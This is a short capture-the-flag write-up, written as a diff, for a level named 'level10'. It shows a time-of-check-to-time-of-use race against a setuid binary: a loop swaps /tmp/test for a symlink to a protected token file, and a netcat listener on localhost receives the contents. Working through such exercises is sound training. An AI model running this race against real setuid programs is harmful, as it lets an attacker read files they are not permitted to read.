@@ -1,0 +1,14 @@
+'level10' has SUID, SGID and Sticky Bit chmod. We need to use it to read 'token'.
+
+First I used gdb and strace to have a better idea of how 'level10' is working. 
+
+Access is called to check if we possess the rights for the file. Then the file is sent through a tcp connection.
+
+with `nc -lk 6969` running in a terminal and `echo "42" > /tmp/test && ./level10 /tmp/test localhost` executed in another one we received
+".*( )*.
+42"
+
+Access's man let us know that we can exploit the 'short time between checking and opening'.
+We need to run
+`while true; do rm -rf /tmp/test ; touch /tmp/test ; rm -rf /tmp/test; ln -s ~/token /tmp/test ; done`
+and `while true; do ./level10 /tmp/test localhost; done` at the same time so that access check the rights of /tmp/test empty file, but the program read and send '/home/user/level10/token'
